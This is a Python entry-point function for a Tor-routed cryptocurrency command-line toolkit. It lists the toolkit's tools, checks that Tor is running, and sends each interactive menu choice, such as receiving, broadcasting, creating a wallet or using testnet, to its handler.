# ── Entry point ────────────────────────────────────────────────────────────

def main():
    # If args given, use direct CLI mode
    if len(sys.argv) > 1:
        arg = sys.argv[1].lower()
        if arg in ("list", "--list"):
            print(f"\n  {B}Core pipeline tools:{N}")
            _core_tools = {k: v for k, v in TOOLS.items()
                           if str(v).startswith(str(CORE))}
            for name in sorted(_core_tools):
                print(f"    {name:14s} → {_core_tools[name].relative_to(ROOT)}")
            print(f"\n  {B}Modules (standalone / expert):{N}")
            _mod_tools = {k: v for k, v in TOOLS.items()
                          if str(v).startswith(str(MODS))}
            for name in sorted(_mod_tools):
                print(f"    {name:14s} → {_mod_tools[name].relative_to(ROOT)}")
            print(f"\n  {B}OPSEC utilities:{N}")
            _opsec_tools = {k: v for k, v in TOOLS.items()
                            if str(v).startswith(str(OPSEC))}
            for name in sorted(_opsec_tools):
                print(f"    {name:14s} → {_opsec_tools[name].relative_to(ROOT)}")
            print(f"\n  {B}Intel (standalone):{N}")
            _intel_tools = {k: v for k, v in TOOLS.items()
                            if str(v).startswith(str(INTEL))}
            for name in sorted(_intel_tools):
                print(f"    {name:14s} → {_intel_tools[name].relative_to(ROOT)}")
            print(f"\n  Usage: python3 run <tool> [args...]\n")
            return
        if arg in ("help", "--help", "-h"):
            banner()
            print(f"  {B}Interactive mode:{N}  python3 run")
            print(f"  {B}Direct mode:{N}       python3 run <tool> [args...]")
            print(f"  {B}List tools:{N}        python3 run list\n")
            return
        cli_passthrough()
        return

    # Detect Tor port once at startup so get_tor_proxy() can default to it
    _startup_status = check_prereqs()
    _detected_tor_port = _startup_status.get("tor_port")
    if _detected_tor_port:
        ok(f"Tor working on port {_detected_tor_port}")
    else:
        print()
        err("Tor is NOT running. Most features will not work.")
        print()
        info("How to fix:")
        info(f"  {B}sudo systemctl start tor{N}     start system Tor (port 9050)")
        info(f"  {B}sudo systemctl status tor{N}    check if it's running")
        info(f"  Or open Tor Browser (uses port 9150)")
        print()
        info("After starting Tor, choose option 0 (System Check) to verify.")

    _tor_ok = bool(_detected_tor_port)

    # Interactive mode
    while True:
        try:
            choice = menu_main(tor_ok=_tor_ok)
        except (EOFError, KeyboardInterrupt):
            print()
            break

        _network_ops = {"1", "2", "3", "4", "5", "6", "7", "8", "t", "i"}
        if choice in _network_ops and not _tor_ok:
            err("This operation requires Tor. Start Tor first, then choose 0 to re-check.")
            info("  sudo systemctl start tor")
            info("  Or open Tor Browser (port 9150)")
            choice = "_blocked"

        try:
            if choice == "1":
                flow_full_pipeline(_detected_tor_port)
            elif choice == "2":
                flow_receive(_detected_tor_port)
            elif choice == "3":
                flow_cold(_detected_tor_port)
            elif choice == "4":
                flow_broadcast(_detected_tor_port)
            elif choice == "5":
                flow_resume(_detected_tor_port)
            elif choice == "6":
                flow_create_wallet(_detected_tor_port)
            elif choice == "7":
                flow_swap_preparer(_detected_tor_port)
            elif choice == "8":
                flow_exit_planner(_detected_tor_port)
            elif choice == "9":
                flow_paranoia()
            elif choice == "0":
                _startup_status = check_prereqs()
                _detected_tor_port = _startup_status.get("tor_port")
                _tor_ok = bool(_detected_tor_port)
                show_status(_startup_status)
                if _tor_ok:
                    ok("Tor is working — all options are now available.")
            elif choice == "t":
                flow_testnet(_detected_tor_port)
            elif choice == "i":
                flow_intel(_detected_tor_port)
            elif choice in ("q", "quit", "exit"):
                break
            elif choice == "_blocked":
                pass
            else:
                warn(f"Unknown option: {choice}")
                continue
        except (EOFError, KeyboardInterrupt):
            print()
            continue
        except SystemExit as _se:
            if _se.code and str(_se.code).startswith("[!]"):
                print(f"\n  {R}{_se.code}{N}")
            pass
        except Exception as _menu_err:
            print()
            err(f"Operation failed: {_menu_err}")
            info("Returning to menu. Check the error above.")

        if choice not in ("q", "quit", "exit"):
            print()
            input(f"  {D}Press Enter to return to menu...{N}")


if __name__ == "__main__":
    main()
